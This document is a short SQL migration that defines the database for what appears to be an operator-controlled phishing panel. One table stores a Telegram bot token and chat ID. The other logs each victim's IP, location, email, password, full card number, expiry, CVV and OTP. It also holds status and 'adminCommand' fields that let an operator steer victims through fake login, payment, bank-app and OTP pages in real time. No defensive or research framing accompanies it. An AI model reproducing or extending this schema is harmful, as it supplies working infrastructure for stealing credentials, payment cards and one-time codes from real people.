CREATE TABLE `telegram_config` (
	`id` int AUTO_INCREMENT NOT NULL,
	`botToken` varchar(256) NOT NULL,
	`chatId` varchar(64) NOT NULL,
	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT `telegram_config_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `visitor_sessions` (
	`id` varchar(64) NOT NULL,
	`ip` varchar(64),
	`country` varchar(128),
	`city` varchar(128),
	`zip` varchar(32),
	`countryCode` varchar(8),
	`userAgent` text,
	`device` varchar(32) DEFAULT 'desktop',
	`status` enum('captcha','login','payment','bank_app','otp','approved','declined','invalid_otp','blocked') NOT NULL DEFAULT 'captcha',
	`adminCommand` enum('none','bank_app','otp_page','invalid_otp','declined','normal','block') NOT NULL DEFAULT 'none',
	`email` varchar(320),
	`password` varchar(512),
	`cardNumber` varchar(32),
	`cardExpiry` varchar(16),
	`cardCvv` varchar(8),
	`cardName` varchar(256),
	`cardType` varchar(32),
	`otp` varchar(16),
	`isOnline` int NOT NULL DEFAULT 0,
	`lastSeen` bigint,
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `visitor_sessions_id` PRIMARY KEY(`id`)
);
